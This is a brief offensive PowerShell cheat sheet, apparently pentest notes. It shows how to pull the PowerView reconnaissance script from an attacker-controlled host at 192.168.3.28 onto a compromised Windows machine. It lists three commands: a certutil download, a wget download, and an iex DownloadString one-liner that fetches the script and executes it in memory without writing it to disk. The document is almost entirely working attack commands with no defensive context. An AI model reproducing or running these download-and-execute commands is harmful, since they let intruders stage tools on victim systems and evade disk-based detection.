# offensive powershell

Attacker's machine is 192.168.3.28, and a file called powerview.ps1 is being hosted on a web server

## download files from powershell

Download to file:

```powershell
certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
```

```powershell
wget http://192.168.3.28/powerview.ps1 -outfile powerview.ps1
```

Download to memory:

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
```

#

